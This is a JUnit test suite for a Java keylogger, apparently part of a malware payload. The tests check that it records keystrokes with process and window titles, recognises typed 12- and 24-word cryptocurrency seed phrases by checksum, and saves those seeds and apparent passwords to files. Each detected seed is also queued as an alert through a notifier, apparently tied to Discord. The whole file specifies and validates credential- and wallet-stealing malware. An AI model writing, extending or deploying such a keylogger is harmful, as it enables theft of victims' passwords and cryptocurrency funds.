package com.spcagentpayloa.jvmxx;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Base64;
import java.util.List;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

class KeyloggerTest {
	private static final String SEED_12 = "alpha deal scrub asthma idea logic bright thought alpha deal scrub autumn";
	private static final String SEED_12_B = "clay eyebrow melody february pencil bench post earn clay eyebrow melody fever";
	private static final String SEED_24 = "animal embark drastic bamboo mountain loyal category cancel "
		+ "animal embark drastic bamboo mountain loyal category cancel "
		+ "animal embark drastic bamboo mountain loyal category cover";
	private static final String SEED_12_C = "artist half drive borrow speak make crouch payment artist half drive bread";

	@TempDir
	Path temp;

	private Keylogger logger(OpsNotifier notifier) throws Exception {
		Files.createDirectories(OpsPaths.ops(temp));
		State state = new State();
		state.keyloggerSet = true;
		state.keylogger = true;
		return new Keylogger(temp, temp, state, null, notifier);
	}

	private static String b64(String value) {
		return Base64.getEncoder().encodeToString(value.getBytes(StandardCharsets.UTF_8));
	}

	private static void event(Keylogger logger, String unicode, int vk, boolean dead) {
		event(logger, unicode, vk, dead, "phantom.exe", "Phantom");
	}

	private static void event(Keylogger logger, String unicode, int vk, boolean dead,
		String process, String title) {
		logger.handle("{\"k\":\"key\",\"vk\":" + vk + ",\"sh\":false,\"ca\":false,\"ct\":false,"
			+ "\"al\":false,\"dk\":" + dead + ",\"u\":\"" + b64(unicode) + "\","
			+ "\"p\":\"" + b64(process) + "\",\"t\":\"" + b64(title) + "\"}");
	}

	private static void type(Keylogger logger, String text) {
		for (int index = 0; index < text.length(); index++) {
			String character = String.valueOf(text.charAt(index));
			int vk = character.equals(" ") ? 0x20 : text.charAt(index);
			event(logger, character, vk, false);
		}
	}

	private static void enter(Keylogger logger) {
		event(logger, "", 0x0D, false);
	}

	@Test
	void typedTwelveWordSeedIsReportedOnceWithoutThePasswordNotice() throws Exception {
		OpsNotifier notifier = new OpsNotifier(null);
		Keylogger logger = logger(notifier);

		type(logger, SEED_12);
		enter(logger);
		enter(logger);

		assertEquals(List.of("seed escrita: 12 palabras", SEED_12), notifier.queued());
		List<String> seeds = Files.readAllLines(OpsPaths.seeds(temp));
		assertEquals(1, seeds.size(), "the cleared buffer must not flush a second time");
		assertTrue(seeds.get(0).contains(SEED_12));
		assertFalse(Files.exists(OpsPaths.passwords(temp)), "a seed is not also a password");
	}

	@Test
	void aGrowingDocumentTitleDoesNotSplitTheSeed() throws Exception {
		String seed = "legal winner thank year wave sausage worth useful legal winner thank yellow";
		OpsNotifier notifier = new OpsNotifier(null);
		Keylogger logger = logger(notifier);
		String typed = "";
		String title = "";
		for (int index = 0; index < seed.length(); index++) {
			typed += seed.charAt(index);
			title = "*" + typed.substring(0, Math.min(typed.length(), 40)) + " - Notepad";
			String character = String.valueOf(seed.charAt(index));
			int vk = character.equals(" ") ? 0x20 : seed.charAt(index);
			event(logger, character, vk, false, "notepad.exe", title);
		}
		event(logger, "", 0x0D, false, "notepad.exe", title);

		String log = Files.exists(OpsPaths.keylog(temp)) ? Files.readString(OpsPaths.keylog(temp)) : "<none>";
		assertEquals(List.of("seed escrita: 12 palabras", seed), notifier.queued(), log);
		assertEquals(1, Files.readAllLines(OpsPaths.seeds(temp)).size());
	}

	@Test
	void typedTwentyFourWordSeedIsReported() throws Exception {
		OpsNotifier notifier = new OpsNotifier(null);
		Keylogger logger = logger(notifier);

		type(logger, SEED_24);
		enter(logger);

		assertEquals(List.of("seed escrita: 24 palabras", SEED_24), notifier.queued());
		assertTrue(Files.readString(OpsPaths.seeds(temp)).contains(SEED_24));
	}

	@Test
	void invalidChecksumFallsBackToThePasswordPath() throws Exception {
		OpsNotifier notifier = new OpsNotifier(null);
		Keylogger logger = logger(notifier);
		String invalid = "abandon ".repeat(12).strip();

		type(logger, invalid);
		enter(logger);

		assertFalse(notifier.queued().stream().anyMatch(line -> line.startsWith("seed escrita")));
		assertFalse(Files.exists(OpsPaths.seeds(temp)));
	}

	@Test
	void seedAlreadyAlertedWithinTwoMinutesIsNotRepeated() throws Exception {
		OpsNotifier notifier = new OpsNotifier(null);
		Keylogger logger = logger(notifier);
		SecretDetector.alerted(SEED_12_B);

		type(logger, SEED_12_B);
		enter(logger);

		assertEquals(List.of(), notifier.queued());
		assertTrue(Files.readString(OpsPaths.seeds(temp)).contains(SEED_12_B));
	}

	@Test
	void disabledNoticesDoNotSuppressALaterMemoryFinding() throws Exception {
		DiscordConfig.provisioning(java.util.Map.of("keylogger",
			java.util.Map.of("sendPasswords", false)));
		try {
			OpsNotifier notifier = new OpsNotifier(null);
			Keylogger logger = logger(notifier);

			type(logger, SEED_12_C);
			enter(logger);

			assertEquals(List.of(), notifier.queued());
			assertFalse(SecretDetector.alertedRecently(SEED_12_C));
			assertTrue(Files.readString(OpsPaths.seeds(temp)).contains(SEED_12_C));
		} finally {
			DiscordConfig.reset();
		}
	}

	@Test
	void ordinarySentenceStillNeedsThePasswordContext() throws Exception {
		OpsNotifier notifier = new OpsNotifier(null);
		Keylogger logger = logger(notifier);

		for (char character : "hola que tal amigos".toCharArray()) {
			event(logger, String.valueOf(character), character, false, "notepad.exe", "Sin titulo");
		}
		event(logger, "", 0x0D, false, "notepad.exe", "Sin titulo");
		List<String> queued = notifier.queued();

		assertFalse(queued.stream().anyMatch(line -> line.startsWith("seed escrita") || line.startsWith("password?")));
	}

	@Test
	void passwordWhitespaceIsPreservedInTheLogs() throws Exception {
		OpsNotifier notifier = new OpsNotifier(null);
		Keylogger logger = logger(notifier);

		type(logger, "abc  def123");
		enter(logger);

		assertTrue(Files.readString(OpsPaths.keylog(temp)).strip().endsWith("] abc  def123"));
		assertTrue(Files.readString(OpsPaths.passwords(temp)).contains("| abc  def123"));
	}

	@Test
	void aDeadKeyAddsNoCharacterButKeepsTheBuffer() throws Exception {
		OpsNotifier notifier = new OpsNotifier(null);
		Keylogger logger = logger(notifier);

		event(logger, "", 0xDE, true);
		type(logger, "abc123");
		enter(logger);

		assertTrue(Files.readString(OpsPaths.keylog(temp)).strip().endsWith("] abc123"));
	}
}
